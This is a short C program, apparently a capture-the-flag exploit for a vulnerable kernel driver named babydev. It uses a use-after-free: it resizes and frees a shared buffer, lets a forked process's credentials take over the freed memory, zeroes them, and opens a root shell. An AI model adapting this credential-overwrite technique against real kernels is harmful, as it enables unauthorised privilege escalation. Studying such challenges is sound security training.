#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
int main(){
    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);
    
    int a = ioctl(fd1,0x10001,0xa8);
    
    close(fd1);
    int pid = fork();
    if(pid < 0){
        printf("error!");
        exit(0);
    }
    else if(pid == 0){
        char b[30] = {0};
        write(fd2,b,30);
        if(getuid() == 0){
             system("/bin/sh");
             exit(0);
        }
    }
    else{
        wait(NULL);
    }

    return 0;
}
